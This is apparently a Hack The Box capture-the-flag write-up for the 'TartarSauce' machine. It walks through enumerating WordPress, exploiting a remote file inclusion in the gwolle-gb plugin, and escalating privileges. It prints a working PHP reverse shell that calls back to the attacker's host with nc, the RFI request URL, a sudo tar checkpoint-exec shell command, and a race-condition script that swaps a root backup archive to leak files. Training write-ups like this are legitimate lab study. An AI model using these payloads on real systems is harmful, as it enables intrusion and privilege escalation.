---
title: "TartarSauce"
date: 2023-09-02T14:28:00+02:00
tags: ["privesc","web","linux","scripting"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with a website which has two CMS one of them called WordPress has a plugin with RFI. A sudoer command allow us to privEsc to onuma. Thanks to a scheduled cronjob which execute a script we are able to leak information in order to PrivEsc."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: TartarSauce
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/TartarSauce

![Untitled](/HTB/tartar-icon.png)

## Tools Used

- nmap
- searchsploit
- wpsan

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

Only one port open which is running a **http** server. This is gonna be our point of entry

## Enumeration

![Untitled](/HTB/tartar-1.png)

Accessing to the website a tartarsauce is displayed.

The **source code** doesn’t show anything useful only the following message `<!--Carry on, nothing to see here :D-->`

So I decided to do a quick **fuzz** to the page in order to see some directories.

This time I am gonna using **gobuster** i better for the extensions fuzz.

```bash
gobuster dir -u http://10.10.10.88/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -t 100 -o fuzz | tee fuzz.save
```

```bash
/index.html           (Status: 200) [Size: 10766]
/robots.txt           (Status: 200) [Size: 208]
/robots.txt           (Status: 200) [Size: 208]
/server-status        (Status: 403) [Size: 299]
/webservices          (Status: 301) [Size: 316] [--> http://10.10.10.88/webservices/]
Progress: 36912 / 36920 (99.98%)
===============================================================
Finished
===============================================================
```

We can see two interesting ones `/robots.txt` and `/web-services`

When we try to access to `/web-services` we get a Forbidden page

![Untitled](/HTB/tartar-2.png)

Accessing `/robots.txt` we can clearly see some other directories which doesn’t leak **gobuster**.

```
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

So before accessing to that links, as they are all webservices directories I decided to **fuzz** again but this time the **webservices directory**.

```bash
[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 131ms]
| URL | http://10.10.10.88/webservices/wp
| --> | http://10.10.10.88/webservices/wp/
    * FUZZ: wp
```

We can clearly see a **WordPress** page, I like to call it VulnPress because always has critical vulns on their plugins so I decide to perform a **WPScan**.

```bash
wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p, t, u | tee wpscan.log
```

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Sat Sep  2 11:37:16 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Sep  2 11:37:18 2023
[+] Requests Done: 2
[+] Cached Requests: 27
[+] Data Sent: 654 B
[+] Data Received: 1.055 KB
[+] Memory used: 259.656 MB
[+] Elapsed time: 00:00:01
```

Doesn’t find any plugin so I start other fuzz with a SecLists plugin wordlist in order to enumerate existent plugins.

```bash
ffuf -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u http://10.10.10.88/webservices/wp/FUZZ  -c -v -t 200 -o fuzz3 | tee fuzz3.save
```

```bash
[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 139ms]
| URL | http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
    * FUZZ: wp-content/plugins/akismet/

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 143ms]
| URL | http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
    * FUZZ: wp-content/plugins/gwolle-gb/

[Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 147ms]
| URL | http://10.10.10.88/webservices/wp/wp-content/plugins/hello.php/
    * FUZZ: wp-content/plugins/hello.php/

[Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 147ms]
| URL | http://10.10.10.88/webservices/wp/wp-content/plugins/hello.php
    * FUZZ: wp-content/plugins/hello.php
```

We have two plugins but we don’t know if they are vulnerable.

## Exploiting

Searching on **searchsploit** I found one **RFI** exploit for **gwolle-gb.**

![Untitled](/HTB/tartar-3.png)

That exploit takes advantage of improper sanitation of abspath **GET** parameter allowing us to access to a remote php file named **wp-load.php.** 

I changed a little bit the **URL** adding `/webservices/wp/`

```bash
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.9/
```

So I created a php one line reverse shell and changed his name to **wp-load.php.**

```php
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4444 >/tmp/f")
?>
```

Once done I started a **python http server**, set a **nc** listener and send a request to the **RFI URL**.

```php
python3 -m http.server 80
```

```php
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/tartar-4.png)

We are **www-data** now.

Navigating to the home’s directory we can see one folder called **onuma**.

When I tried to access in order to cat the user’s flag I receive the following error.

![Untitled](/HTB/tartar-7.png)

This is a sign that we need to **privEsc**.

## Escalating Privilege

First I checked for `sudo -l` privileges.

```bash
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

We can use `/bin/tar` as **onuma** and looking up on GTFOBins we can see that is possible to **privEsc** with the following command.

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![Untitled](/HTB/tartar-5.png)

![Untitled](/HTB/tartar-6.png)

![Untitled](/HTB/tartar-8.png)

At **onuma**’s home directory we can see a **.mysql_history** file which seems not empty.

```bash
_HiStOrY_V2_
create\040database\040backuperer;
exit
```

It seems like is trying to create a database called **backuperer**.

I tried to run mysql command with common credentials but failed.

So I used **moniProc.sh** which is a bash script which I used in a lot of writeups in order to see scheduled processes.

```bash
> /usr/sbin/CRON -f
> /bin/bash /usr/sbin/backuperer
> /lib/systemd/systemd-udevd
> /lib/systemd/systemd-udevd
> /lib/systemd/systemd-udevd
> /lib/systemd/systemd-udevd
> /lib/systemd/systemd-udevd
< /lib/systemd/systemd-udevd
< /lib/systemd/systemd-udevd
< /lib/systemd/systemd-udevd
< /lib/systemd/systemd-udevd
< /lib/systemd/systemd-udevd
> /bin/bash /usr/sbin/backuperer
< /bin/bash /usr/sbin/backuperer
> /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
> /bin/sleep 30
> /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
> gzip
< /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
< /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html
< gzip
```

We can observe with the **moniProc.sh** output that we have a cronjob executing on the background a bash script located at **/usr/sbin/backuperer.**

It’s the second time we see such name on the machine and I don't think it's a coincidence.

```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Basically the program starts removing all the content starting with a dot and the `/var/check` directory then creates a tar of `/var/www/html` with a name started with a dot followed by a hash and saves the backup temporarily on `/var/tmp.`

Once done the program sleeps 30 seconds and after that extracts the backup content on `/var/tmp/check` in order to check the integrity.

Once extracted the program checks if the integrity_chk() function output something which basically runs a diff of the files extracted and the files on 

`/var/www/html`.

If the file are modified the diff function output is saved on `/var/backups/onuma_backup_error.txt`

If nothing is outputted by the integrity_chk() function the zip file is saved on `/var/backups/onuma-www-dev.bak`

Finally all the content starting with a dot and the `/var/check` directory is removed.

So I realized as we can write on `/var/tmp` and backuperer is executed as root if we try to get the hash of the file and change the backup files to other one a little bit modified we can get information leak by diff function at `/var/backups/onuma_backup_error.txt`

```bash
watch -n 1 ls -la /var/tmp
```

```bash
Every 1.0s: ls -la /var/tmp                                                                                                                                                             Sat Sep  2 07:36:11 2023

total 11284
drwxrwxrwt 10 root  root      4096 Sep  2 07:36 .
drwxr-xr-x 14 root  root      4096 May 12  2022 ..
-rw-r--r--  1 onuma onuma 11511296 Sep  2 07:36 .0beccd6f392b2e0f1a5676f11cbe845f4d5c5814
drwx------  3 root  root      4096 May 12  2022 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root      4096 May 12  2022 systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR
drwx------  3 root  root      4096 May 12  2022 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
drwx------  3 root  root      4096 May 12  2022 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
drwx------  3 root  root      4096 May 12  2022 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
drwx------  3 root  root      4096 Sep  2 05:14 systemd-private-af355da20cf24e91b8a040c8e7aa1462-systemd-timesyncd.service-NYmoBL
drwx------  3 root  root      4096 May 12  2022 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
drwx------  3 root  root      4096 May 12  2022 systemd-private-e11430f63fc04ed6bd67ec90687cb00e-systemd-timesyncd.service-PYhxgX
```

Thanks to the previous command we can see every second the changes on the directory.

Theres one file named with a dot and followed by 40 characters. So we only need a **regex** for it

```bash
ls -la /var/tmp | grep -oP '\.\w{40}'
```

The above command help us to list that type of files.

```bash
#!/bin/bash

while true; do
    filename="$(ls -la /var/tmp/ | grep -oP '\.\w{40}')"

    if [ "$filename" ]; then
        echo "Found a file with a hash in the name"
        echo "Removing file..."
        rm /var/tmp/$filename
				echo "Changing the file..."
        mv payload /var/tmp/$filename
        echo "Done"
				exit 0
    fi
done
```

So with the following exploit we can save the hash name on a variable and rename or payload file in order to change the backup file.

Now the thing is to build a backup payload, first I am going to tar the `/var/www/html` folder and send it via python http server.

```bash
tar -zcvf payload /var/www/html
```

Once done let’s extracted with

```bash
tar -zxvf payload .
```

![Untitled](/HTB/tartar-9.png)

Now we only need to delete the existent index.html file and put as sudo a soft link to `/root/root.txt` as we are on our system we are able to do it.

```bash
rm index.html
sudo su
ln -s /root/root.txt index.html
```

Once executed we have now the modified backup file, now when the programs runs a diff with our modified data it’s gonna leak the root.txt flag.

We need now to send the crafted exploit and the payload previously zipped with tar to the remote machine in the same directory.

![Untitled](/HTB/tartar-10.png)

Once executed we receive the waited output.

Let’s check `/var/backups/onuma_backup_error.txt` for the **root’s flag**.

![Untitled](/HTB/tartar-11.png)

**Thank you for reading, and happy hacking! 😄**